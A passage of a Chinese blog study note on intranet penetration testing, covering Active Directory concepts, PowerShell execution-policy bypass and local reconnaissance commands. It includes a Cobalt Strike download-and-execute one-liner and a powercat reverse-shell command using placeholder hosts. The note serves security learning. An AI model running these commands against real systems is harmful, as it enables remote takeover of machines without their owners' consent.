@@ -1,0 +1,1255 @@
+<!DOCTYPE html>
+
+
+<html theme="dark" showBanner="true" hasBanner="true" > 
+<link href="/fontawesome/css/fontawesome.css" rel="stylesheet">
+<link href="/fontawesome/css/brands.css" rel="stylesheet">
+<link href="/fontawesome/css/solid.css" rel="stylesheet">
+<script src="/js/color.global.min.js" ></script>
+<script src="/js/load-settings.js" ></script>
+<head>
+  <meta charset="utf-8">
+  
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-B0FHXMTYNC"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-B0FHXMTYNC');
+</script>
+<!-- End Google Analytics -->
+
+  
+  <title>内网安全攻防笔记 | Kizureina&#39;s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="第一章 内网渗透测试基础1.1 内网基础1) 工作组(WorkGroup)概念：最常见最简单最普通的资源管理模式  特点:  与域相对  不多于10台计算机  计算机之间关系是对等的  2) 域(Domain)概念：有安全边界的计算机集合 域控(DC-Domain Controller)概念：负责每一台联入网络的电脑和用户的验证工作的服务器，类似管理服务器的计算机。 域控特点：  包含存储所有账户">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网安全攻防笔记">
+<meta property="og:url" content="https://kizureina.github.io/2024/06/10/Note-of-Local-Address-Net-Security/index.html">
+<meta property="og:site_name" content="Kizureina&#39;s Blog">
+<meta property="og:description" content="第一章 内网渗透测试基础1.1 内网基础1) 工作组(WorkGroup)概念：最常见最简单最普通的资源管理模式  特点:  与域相对  不多于10台计算机  计算机之间关系是对等的  2) 域(Domain)概念：有安全边界的计算机集合 域控(DC-Domain Controller)概念：负责每一台联入网络的电脑和用户的验证工作的服务器，类似管理服务器的计算机。 域控特点：  包含存储所有账户">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://kizureina.github.io/images/image-20240610160246761.png">
+<meta property="og:image" content="https://kizureina.github.io/images/image-20240610162219215.png">
+<meta property="og:image" content="https://kizureina.github.io/images/image-20240610162227334.png">
+<meta property="og:image" content="https://kizureina.github.io/images/image-20240610162237517.png">
+<meta property="og:image" content="https://kizureina.github.io/images/image-20240610215542250.png">
+<meta property="og:image" content="https://kizureina.github.io/images/image-20240610220604143.png">
+<meta property="og:image" content="https://kizureina.github.io/images/image-20240610235011138.png">
+<meta property="article:published_time" content="2024-06-10T06:50:14.000Z">
+<meta property="article:modified_time" content="2024-06-10T16:21:44.338Z">
+<meta property="article:author" content="Kizurena">
+<meta property="article:tag" content="Web Computer Science Anime Comic Galgame">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://kizureina.github.io/images/image-20240610160246761.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Kizureina's Blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-32.png" sizes="32x32">
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-128.png" sizes="128x128">
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-180.png" sizes="180x180">
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-192.png" sizes="192x192">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-32.png" sizes="32x32">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-128.png" sizes="128x128">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-180.png" sizes="180x180">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-192.png" sizes="192x192">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  
+  
+    
+<div id="banner" class="">
+  <img src="/banner.png" itemprop="image">
+  <div id="banner-dim"></div>
+</div>
+ 
+   
+  <div id="main-grid" class="shadow   ">
+    <div id="nav" class=""  >
+      <navbar id="navbar">
+  <nav id="title-nav">
+    <a href="/">
+      <div id="vivia-logo">
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+      </div>
+      <div>Kizureina's Blog </div>
+    </a>
+  </nav>
+  <nav id="main-nav">
+    
+      <a class="main-nav-link" href="/">Home</a>
+    
+      <a class="main-nav-link" href="/archives">Archives</a>
+    
+      <a class="main-nav-link" href="/about">About</a>
+    
+      <a class="main-nav-link" href="/links">Links</a>
+    
+  </nav>
+  <nav id="sub-nav">
+    <a id="theme-btn" class="nav-icon">
+      <span class="material-symbols-rounded light-mode-icon">wb_sunny</span>
+      <span class="material-symbols-rounded dark-mode-icon">dark_mode</span>
+    </a>
+    
+      <a id="nav-rss-link" class="nav-icon mobile-hide" href="/atom.xml" title="RSS 订阅">
+        <span class="material-symbols-rounded rss">rss_feed</span>
+      </a>
+    
+    <a id="nav-search-btn" class="nav-icon" title="搜索" style="display: none;">
+      <span class="material-symbols-rounded">search</span>
+    </a>
+    <div id="nav-menu-btn" class="nav-icon">
+      <span class="material-symbols-rounded">menu</span>
+    </div>
+  </nav>
+</navbar>
+<div id="nav-dropdown" class="hidden">
+  <div id="dropdown-link-list">
+    
+      <a class="nav-dropdown-link" href="/">Home</a>
+    
+      <a class="nav-dropdown-link" href="/archives">Archives</a>
+    
+      <a class="nav-dropdown-link" href="/about">About</a>
+    
+      <a class="nav-dropdown-link" href="/links">Links</a>
+    
+    
+      <a class="nav-dropdown-link" href="/atom.xml" title="RSS 订阅">RSS</a>
+     
+    </div>
+</div>
+<script>
+  let dropdownBtn = document.getElementById("nav-menu-btn");
+  let dropdownEle = document.getElementById("nav-dropdown");
+  dropdownBtn.onclick = function() {
+    dropdownEle.classList.toggle("hidden");
+  }
+</script>
+    </div>
+    <div id="sidebar-wrapper">
+      <sidebar id="sidebar">
+  
+    <div class="widget-wrap">
+  <div class="info-card">
+    <div class="avatar">
+      
+        <image src=/assets/avatar2.png></image>
+      
+      <div class="img-dim"></div>
+    </div>
+    <div class="info">
+      <div class="username">Kizureina </div>
+      <div class="dot"></div>
+      <div class="subtitle">I know nothing except the fact of my ignorance. </div>
+      <div class="link-list">
+        
+          <a class="link-btn" target="_blank" rel="noopener" href="https://github.com/Kizureina" title="GitHub"><i class="fa-brands fa-github"></i></a>
+         
+      </div>  
+    </div>
+  </div>
+</div>
+
+  
+  <div class="sticky">
+    
+      
+  <div class="widget-wrap">
+    <div class="widget">
+      <h3 class="widget-title">标签</h3>
+      <ul class="widget-tag-list" itemprop="keywords"><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Advanced-Mathematics/" rel="tag">Advanced Mathematics</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Android/" rel="tag">Android</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Anime/" rel="tag">Anime</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Comic/" rel="tag">Comic</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Galgame/" rel="tag">Galgame</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/JavaScript/" rel="tag">JavaScript</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Linux/" rel="tag">Linux</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Machine-Learning/" rel="tag">Machine Learning</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/RCE/" rel="tag">RCE</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Reverse-shell/" rel="tag">Reverse shell</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/java/" rel="tag">java</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/java-RCE/" rel="tag">java RCE</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/%E5%B5%8C%E5%85%A5%E5%BC%8F/" rel="tag">嵌入式</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/%E7%A1%AC%E4%BB%B6/" rel="tag">硬件</a></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget-wrap">
+    <div class="widget">
+      <h3 class="widget-title">归档</h3>
+      
+      
+        <a class="archive-link" href="/archives/2024/06 ">
+          六月 2024 
+          <div class="archive-count">3 </div>
+        </a>
+      
+        <a class="archive-link" href="/archives/2024/05 ">
+          五月 2024 
+          <div class="archive-count">5 </div>
+        </a>
+      
+        <a class="archive-link" href="/archives/2024/04 ">
+          四月 2024 
+          <div class="archive-count">2 </div>
+        </a>
+      
+        <a class="archive-link" href="/archives/2024/03 ">
+          三月 2024 
+          <div class="archive-count">2 </div>
+        </a>
+      
+        <a class="archive-link" href="/archives/2024/02 ">
+          二月 2024 
+          <div class="archive-count">1 </div>
+        </a>
+      
+        <a class="archive-link" href="/archives/2024/01 ">
+          一月 2024 
+          <div class="archive-count">2 </div>
+        </a>
+      
+        <a class="archive-link" href="/archives/2023/12 ">
+          十二月 2023 
+          <div class="archive-count">1 </div>
+        </a>
+      
+        <a class="archive-link" href="/archives/2023/11 ">
+          十一月 2023 
+          <div class="archive-count">1 </div>
+        </a>
+      
+        <a class="archive-link" href="/archives/2023/10 ">
+          十月 2023 
+          <div class="archive-count">1 </div>
+        </a>
+      
+        <a class="archive-link" href="/archives/2023/09 ">
+          九月 2023 
+          <div class="archive-count">1 </div>
+        </a>
+      
+        <a class="archive-link" href="/archives/2023/07 ">
+          七月 2023 
+          <div class="archive-count">5 </div>
+        </a>
+      
+        <a class="archive-link" href="/archives/2023/06 ">
+          六月 2023 
+          <div class="archive-count">1 </div>
+        </a>
+      
+        <a class="archive-link" href="/archives/2023/03 ">
+          三月 2023 
+          <div class="archive-count">2 </div>
+        </a>
+      
+        <a class="archive-link" href="/archives/2023/02 ">
+          二月 2023 
+          <div class="archive-count">1 </div>
+        </a>
+      
+        <a class="archive-link" href="/archives/2023/01 ">
+          一月 2023 
+          <div class="archive-count">4 </div>
+        </a>
+      
+        <a class="archive-link" href="/archives/2022/12 ">
+          十二月 2022 
+          <div class="archive-count">3 </div>
+        </a>
+      
+        <a class="archive-link" href="/archives/2022/11 ">
+          十一月 2022 
+          <div class="archive-count">2 </div>
+        </a>
+      
+        <a class="archive-link" href="/archives/2022/09 ">
+          九月 2022 
+          <div class="archive-count">2 </div>
+        </a>
+      
+        <a class="archive-link" href="/archives/2022/06 ">
+          六月 2022 
+          <div class="archive-count">1 </div>
+        </a>
+      
+        <a class="archive-link" href="/archives/2022/04 ">
+          四月 2022 
+          <div class="archive-count">1 </div>
+        </a>
+      
+        <a class="archive-link" href="/archives/2022/03 ">
+          三月 2022 
+          <div class="archive-count">1 </div>
+        </a>
+      
+        <a class="archive-link" href="/archives/2022/02 ">
+          二月 2022 
+          <div class="archive-count">1 </div>
+        </a>
+      
+        <a class="archive-link" href="/archives/2022/01 ">
+          一月 2022 
+          <div class="archive-count">3 </div>
+        </a>
+      
+        <a class="archive-link" href="/archives/2021/12 ">
+          十二月 2021 
+          <div class="archive-count">1 </div>
+        </a>
+      
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget-wrap">
+    <div class="widget">
+      <h3 class="widget-title">最新文章</h3>
+      <ul>
+        
+          <li>
+            <a href="/2024/06/10/Note-of-Local-Address-Net-Security/">内网安全攻防笔记</a>
+          </li>
+        
+          <li>
+            <a href="/2024/06/08/Analysis-of-CVE-2024-4577/">古老漏洞的复活：php-cgi命令注入(CVE-2024-4577)漏洞分析</a>
+          </li>
+        
+          <li>
+            <a href="/2024/06/04/Note-of-Compilation-Principle/">编译原理笔记</a>
+          </li>
+        
+          <li>
+            <a href="/2024/05/27/Advanced-Mathematics-Review2/">高等数学拾遗(下)</a>
+          </li>
+        
+          <li>
+            <a href="/2024/05/18/AutoBangumi-qbit-and-plex-on-mini-server/">AutoBangumi + qbit + plex搭建优雅的追番服务</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+    
+  </div>
+</sidebar>
+    </div>
+    <div id="content-body">
+       
+
+<article id="post-Note-of-Local-Address-Net-Security" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  
+    
+   
+  <div class="article-inner">
+    <div class="article-main">
+      <header class="article-header">
+        
+<div class="main-title-bar">
+  <div class="main-title-dot"></div>
+  
+    
+      <h1 class="p-name article-title" itemprop="headline name">
+        内网安全攻防笔记
+      </h1>
+    
+  
+</div>
+
+        <div class='meta-info-bar'>
+          <div class="meta-info">
+  <time class="dt-published" datetime="2024-06-10T06:50:14.000Z" itemprop="datePublished">2024-06-10</time>
+</div>
+          <div class="need-seperator meta-info">
+            <div class="meta-cate-flex">
+  
+  <a class="meta-cate-link" href="/categories/WebSec/">WebSec</a>
+   
+</div>
+  
+          </div>
+          <div class="wordcount need-seperator meta-info">
+            8.1k 词 
+          </div>
+        </div>
+        
+      </header>
+      <div class="e-content article-entry" itemprop="articleBody">
+        
+          <h1 id="第一章-内网渗透测试基础"><a href="#第一章-内网渗透测试基础" class="headerlink" title="第一章 内网渗透测试基础"></a>第一章 内网渗透测试基础</h1><h2 id="1-1-内网基础"><a href="#1-1-内网基础" class="headerlink" title="1.1 内网基础"></a>1.1 内网基础</h2><h3 id="1-工作组-WorkGroup"><a href="#1-工作组-WorkGroup" class="headerlink" title="1) 工作组(WorkGroup)"></a>1) 工作组(WorkGroup)</h3><p>概念：最常见最简单最普通的资源管理模式 </p>
+<p>特点:</p>
+<ul>
+<li>与域相对 </li>
+<li>不多于10台计算机 </li>
+<li>计算机之间关系是对等的</li>
+</ul>
+<h3 id="2-域-Domain"><a href="#2-域-Domain" class="headerlink" title="2) 域(Domain)"></a>2) 域(Domain)</h3><p>概念：有<em>安全边界</em>的计算机集合</p>
+<h4 id="域控-DC-Domain-Controller"><a href="#域控-DC-Domain-Controller" class="headerlink" title="域控(DC-Domain Controller)"></a>域控(DC-Domain Controller)</h4><p>概念：负责每一台联入网络的电脑和用户的验证工作的服务器，类似管理服务器的计算机。</p>
+<p>域控特点：</p>
+<ul>
+<li>包含存储所有账户，密码，域内计算机等信息的数据库 </li>
+<li>所有的权限身份验证，网络访问管理在域控上进行 </li>
+<li>可以有多台</li>
+</ul>
+<h4 id="域环境"><a href="#域环境" class="headerlink" title="域环境"></a>域环境</h4><h5 id="父域和子域"><a href="#父域和子域" class="headerlink" title="父域和子域"></a>父域和子域</h5><p>关系：一个父域包含多个子域，父域子域是相对关系 </p>
+<p>特点：父域与子域的安全策略独立 </p>
+<h5 id="域树"><a href="#域树" class="headerlink" title="域树"></a>域树</h5><p>概念：是多个域通过建立信任关系组成的集合。 </p>
+<p>格式：用【.】隔开，越靠后越高级，最靠后的成为最高级子域或一级域，每个【.】代表一个层次 </p>
+<p>特点：子域只能以父域的名字作为其域名的后缀，域的名字是连续的，名字越长级别越低 </p>
+<h5 id="域森林"><a href="#域森林" class="headerlink" title="域森林"></a>域森林</h5><p>概念：多个域树通过建立信任关系组成的集合</p>
+<h3 id="3-活动目录-Active-Dictionary"><a href="#3-活动目录-Active-Dictionary" class="headerlink" title="3) 活动目录(Active Dictionary)"></a>3) 活动目录(Active Dictionary)</h3><p>概念：域环境中提供目录服务的组件 </p>
+<p>存储内容：用于<em>存储有关网络对象</em>（用户，组，计算机，共享资源，打印机，联系人等）的信息 </p>
+<p>功能：</p>
+<ol>
+<li>账号集中管理 </li>
+<li>软件集中管理 </li>
+<li>环境集中管理 </li>
+<li>增强安全性 </li>
+<li>更可靠，更短的宕机时间</li>
+</ol>
+<p>应用：活动目录是由微软提供的统一管理基础平台,ISA(防火墙)，Exchange(邮件)，SMS(系统管理服务器)，均依赖于活动目录</p>
+<h3 id="4-安全域划分"><a href="#4-安全域划分" class="headerlink" title="4) 安全域划分"></a>4) 安全域划分</h3><h4 id="DMZ"><a href="#DMZ" class="headerlink" title="DMZ"></a>DMZ</h4><p>概念：DMZ称为隔离区，是非安全系统与安全系统之间的缓冲区，用于解决安装防火墙后外部网络不能访问内部网络的问题 </p>
+<h4 id="访问控制策略"><a href="#访问控制策略" class="headerlink" title="访问控制策略"></a>访问控制策略</h4><p>内网：可以访问外网，可以访问DMZ </p>
+<p>外网：不能访问内网，可以访问DMZ </p>
+<p>DMZ：不能访问内网，不能访问外网（有例外，如邮件服务器） </p>
+<h4 id="两种攻击方式"><a href="#两种攻击方式" class="headerlink" title="两种攻击方式"></a>两种攻击方式</h4><p>鱼叉攻击：直接<em>针对特定目标</em>进行攻击，如钓鱼邮件 </p>
+<p>水坑攻击：没有确定的目的，如在受害者常访问的网站设置恶意代码等待受害者踩坑</p>
+<h3 id="5-域内权限解读"><a href="#5-域内权限解读" class="headerlink" title="5) 域内权限解读"></a>5) 域内权限解读</h3><p><strong>组</strong>的概念：用户账号的集合（可以简化网络的维护和管理工作） </p>
+<h4 id="不同类型组的特点"><a href="#不同类型组的特点" class="headerlink" title="不同类型组的特点"></a>不同类型组的特点</h4><p>域本地组来自于全林，作用于本域； （多域用户访问本域内资源） </p>
+<p>全局组来自于本域，作用于全林； （本域用户访问多域资源） </p>
+<p>通用组来自于全林，作用于全林； （保存不经常变化的信息，不推荐直接保存账号信息） </p>
+<blockquote>
+<p>注解：“来自”指哪里的用户或者组可以添加进入该组中，“作用”指该组可以被哪里<em>使用</em></p>
+<p>使用既可以指添加权限，也可以指添加到其他组 </p>
+<p>组本身可以添加到其他组中，相当于添加组内所有成员，且之后对组本身的改动也会同步到以此方式添加的其他组</p>
+</blockquote>
+<h4 id="A-G-DL-P策略"><a href="#A-G-DL-P策略" class="headerlink" title="A-G-DL-P策略"></a>A-G-DL-P策略</h4><p>概念：将<em>用户账号</em>添加到<em>全局组</em>中，将全局组添加到<em>域本地组</em>中，然后为域本地组<em>分配资源权限</em>。 </p>
+<ul>
+<li>A表示用户账号 </li>
+<li>G表示全局组</li>
+<li>DL表示域本地组</li>
+<li>P表示资源权限(另外，U表示通用组)</li>
+</ul>
+<h4 id="常用的域本地组权限"><a href="#常用的域本地组权限" class="headerlink" title="常用的域本地组权限"></a>常用的域本地组权限</h4><ul>
+<li><strong>管理员组</strong>(Administrators)：成员可以不受限制地存取计算机&#x2F;域的资源。 </li>
+<li>账号操作员组（AccountOperators)：成员可以创建和管理该域中的用户和组并为其设置权限，也可以在本地登录域控制器。 </li>
+<li>服务器操作员组（ServerOperators)：成员可以管理域服务器</li>
+</ul>
+<h4 id="重要全局组、通用组权限"><a href="#重要全局组、通用组权限" class="headerlink" title="重要全局组、通用组权限"></a>重要全局组、通用组权限</h4><ul>
+<li><strong>域管理员组</strong>（Domain Admins）： 成员在所有加入域的服务器（工作站）、域控制器和活动目录中均默认拥有完整的管理员权限。 </li>
+<li>企业系统管理员组（Enterprise Admins）： 是域森林根域中的一个组。 该组在域森林中的每个域内都是Administrators组的成员，因此对所有域控制器都有完全访问权。 </li>
+<li>架构管理员组(Schema Admins) ： 是域森林根域中的一个组。 可以修改活动目录和域森林的模式。该组是为活动目录和域控制器提供完整权限的域用户组 </li>
+<li><strong>域用户组</strong>(Domain Users) ： 包含所有的域成员 <em>默认情况下建立的用户账号均属于域用户组</em></li>
+</ul>
+<h2 id="1-2-主机平台与工具"><a href="#1-2-主机平台与工具" class="headerlink" title="1.2 主机平台与工具"></a>1.2 主机平台与工具</h2><h3 id="虚拟机"><a href="#虚拟机" class="headerlink" title="虚拟机"></a>虚拟机</h3><p>三种网络配置方式：</p>
+<ol>
+<li>桥接模式：虚拟机视为独立的机器，有DHCP可以自动分配地址，无DHCP只能手动分配地址；</li>
+<li>NAT模式： 虚拟机通过物理机的连接访问网络（即NAT地址转换），除主机外其他网络无法访问虚拟机（默认模 式）；</li>
+<li>Host-only模式：最严格的网卡配置，虚拟机处于独立的网段，只能通过连接共享功能实现共享上网，否则无法上网。（渗透环境推荐）</li>
+</ol>
+<h3 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h3><p>概念：一种命令行外壳程序和脚本环境 </p>
+<p>环境：自Win7后内置于Windows系统中，脚本文件以<code>.ps1</code>为结尾 </p>
+<p>特点:</p>
+<ul>
+<li>默认安装在win7以上的操作系统中 </li>
+<li>脚本<em>可以在内存中</em>运行，不需要写入磁盘（不落地） </li>
+<li>几乎不触发杀毒软件 </li>
+<li>可以远程执行 </li>
+<li>运行通常不会被阻止 </li>
+<li>可用于管理活动目录</li>
+</ul>
+<p>查看版本：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-Host</span></span><br><span class="line"><span class="variable">$PSVersionTable</span>.PSversion</span><br></pre></td></tr></table></figure>
+
+<p>在cmd中运行只要加上<code>powershell</code>或者<code>powershell.exe</code>即可。</p>
+<h4 id="执行策略"><a href="#执行策略" class="headerlink" title="执行策略"></a>执行策略</h4><p>主要有四种策略：</p>
+<ul>
+<li>Restricted (默认设置,脚本不能运行) </li>
+<li>RemoteSigned (本地可以运行,网上下载且<em>无签名</em>的不可以运行) </li>
+<li>AllSigned (本地和网上的都需要签名才可以运行) </li>
+<li>UnRestricted (所有都可以运行)</li>
+</ul>
+<p>查看当前策略：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ExecutionPolicy</span></span><br></pre></td></tr></table></figure>
+
+<p>配置执行策略：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-ExecutionPolicy</span> &lt;策略名称&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h4><p>命令格式特点：采用动词-名词的形式 </p>
+<p>别名：兼容Windows Command 和Linux Shell </p>
+<p>大小写区分：不区分大小写 </p>
+<p>常用<strong>文件操作</strong>命令：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">New-Item</span> &lt;目录名&gt;<span class="literal">-ItemType</span> Directory 新建目录</span><br><span class="line"><span class="built_in">New-Item</span> &lt;文件名&gt;<span class="literal">-ItemType</span> File 新建文件</span><br><span class="line"><span class="built_in">Remove-Item</span> &lt;文件名&gt; 删除文件</span><br><span class="line"><span class="built_in">Get-content</span> &lt;文件名&gt; 显示文本内容</span><br><span class="line"><span class="built_in">Set-content</span> &lt;文件名&gt;<span class="literal">-value</span> &lt;<span class="string">&quot;文件内容&quot;</span>&gt; 设置文本内容</span><br><span class="line"><span class="built_in">Add-content</span> &lt;文件名&gt;<span class="literal">-value</span> &lt;<span class="string">&quot;文件内容&quot;</span>&gt; 追加内容</span><br><span class="line"><span class="built_in">Clear-content</span> &lt;文件名&gt; 删除内容</span><br></pre></td></tr></table></figure>
+
+<p>运行脚本需要用管理员权限将执行策略从restricted改为unrestricted。</p>
+<h4 id="绕过本地权限执行脚本"><a href="#绕过本地权限执行脚本" class="headerlink" title="绕过本地权限执行脚本"></a>绕过本地权限执行脚本</h4><ol>
+<li>直接bypass</li>
+</ol>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powerShell.exe <span class="literal">-ExecutionPolicy</span> bypass <span class="operator">-File</span> test.ps1</span><br><span class="line">powerShell.exe <span class="literal">-exec</span> bypass <span class="literal">-Command</span> <span class="string">&quot;&amp;&#123;Import-Module .\test.ps1&#125;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>下载远程脚本在内存中执行</li>
+</ol>
+<p>例如Cobalt Strike生成的Web投递木马攻击命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c <span class="string">&#x27;IEX ((new-object net.webclient).downloadstring(&quot;host:port/a&quot;))&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>或者先远程读取脚本进内存再执行脚本：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="built_in">IEX</span> (<span class="built_in">New-Object</span> System.Net.Webclient).DownloadString(<span class="string">&#x27;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#x27;</span>); powercat <span class="literal">-c</span> &#123;host&#125; <span class="literal">-p</span> <span class="number">4444</span> <span class="literal">-e</span> cmd</span><br></pre></td></tr></table></figure>
+
+<p>这些命令也可以在cmd中执行。</p>
+<p>参数说明：</p>
+<ul>
+<li>-ExecutionPolicy Bypass (-exec bypass) 绕过安全策略 </li>
+<li>-Windowstyle Hidden (-w Hidden) 隐藏窗口 </li>
+<li>-NoProfile (NoP)控制台不加载当前用户的配置文件 </li>
+<li>-NonInteractive(NonI) 不为用户提供交互式的提示</li>
+</ul>
+<p>将本地脚本导入powershell模块:</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> .\powercat.ps1</span><br></pre></td></tr></table></figure>
+
+<h1 id="第二章-内网信息收集"><a href="#第二章-内网信息收集" class="headerlink" title="第二章 内网信息收集"></a>第二章 内网信息收集</h1><h2 id="1-收集本机信息"><a href="#1-收集本机信息" class="headerlink" title="1. 收集本机信息"></a>1. 收集本机信息</h2><h3 id="查询基本配置"><a href="#查询基本配置" class="headerlink" title="查询基本配置"></a>查询基本配置</h3><p>查询网络配置信息：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure>
+
+<p>查询操作系统和版本(中文系统和英文系统)：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systeminfo | findstr /B /C:<span class="string">&quot;OS 名称&quot;</span> /C:<span class="string">&quot;OS 版本&quot;</span> </span><br><span class="line">systeminfo | findstr /B /C:<span class="string">&quot;OS Name&quot;</span> /C:<span class="string">&quot;OS Version&quot;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>注：&#x2F;b指若在开头则匹配，&#x2F;c指匹配指定字符串 </p>
+</blockquote>
+<p>查看系统体系架构：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> %Processor_Architecture% </span><br></pre></td></tr></table></figure>
+
+<p>查看软件安装版本和路径：</p>
+<ul>
+<li>使用wmic:</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic product get name,version</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>使用powershell</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="string">&quot;Get-WmiObject -class Win32_Product&quot;</span> | Select-Object -Property name,version</span><br></pre></td></tr></table></figure>
+
+<h3 id="查询进程信息"><a href="#查询进程信息" class="headerlink" title="查询进程信息"></a>查询进程信息</h3><p>查询进程列表，进程用户：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist</span><br></pre></td></tr></table></figure>
+
+<p>查看本机服务信息：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service list brief</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>注解： brief作为list的参数，指列表中只显示摘要信息 </p>
+</blockquote>
+<p>查看进程信息:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic process list brief </span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20240610160246761.png" alt="image-20240610160246761"></p>
+<p>查看启动程序信息：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic startup get <span class="built_in">command</span>,caption</span><br></pre></td></tr></table></figure>
+
+<p>查看计划任务:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /query /fo LIST /v</span><br></pre></td></tr></table></figure>
+
+<p>查看开机时间：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net statistics workstation</span><br></pre></td></tr></table></figure>
+
+<p>查看用户列表：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure>
+
+<p>获取本地管理员信息（通常包含<strong>域用户</strong>）：</p>
